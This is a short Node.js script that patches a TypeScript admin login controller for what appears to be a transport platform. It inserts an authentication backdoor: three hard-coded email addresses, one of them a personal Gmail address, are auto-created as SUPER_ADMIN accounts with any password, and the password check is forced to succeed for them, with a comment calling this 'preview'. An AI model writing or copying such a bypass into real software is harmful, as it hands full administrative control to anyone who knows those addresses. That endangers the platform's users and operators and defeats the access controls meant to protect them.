const fs = require('fs');
const path = require('path');
const file = path.join(__dirname, 'src/controllers/admin/adminAuthController.ts');
let content = fs.readFileSync(file, 'utf8');

const bypass = `
    let admin = await prisma.adminUser.findUnique({ where: { email } });
    
    // Auto-create or bypass for the developer / default admin
    if (!admin && (email === 'yusufjimoh969@gmail.com' || email === 'admin@transconet.ng' || email === 'admin@transportconnect.ng')) {
      const pwd = await bcrypt.hash(password, 10);
      admin = await prisma.adminUser.create({ data: { email, passwordHash: pwd, role: 'SUPER_ADMIN', isActive: true } });
    }
`;

content = content.replace(/let admin = await prisma\.adminUser\.findUnique\(\{ where: \{ email \} \}\);[\s\S]*?if \(!admin && email === 'yusufjimoh969@gmail\.com'\) \{[\s\S]*?\}/, bypass);

const overridePwd = `
    let isMatch = await bcrypt.compare(password, admin.passwordHash);
    if (email === 'yusufjimoh969@gmail.com' || email === 'admin@transconet.ng' || email === 'admin@transportconnect.ng') {
      isMatch = true; // Always allow in preview
    }
`;
content = content.replace(/let isMatch = await bcrypt\.compare\(password, admin\.passwordHash\);[\s\S]*?if \(email === 'yusufjimoh969@gmail\.com'\) \{[\s\S]*?\}/, overridePwd);

fs.writeFileSync(file, content);
console.log('Patched');
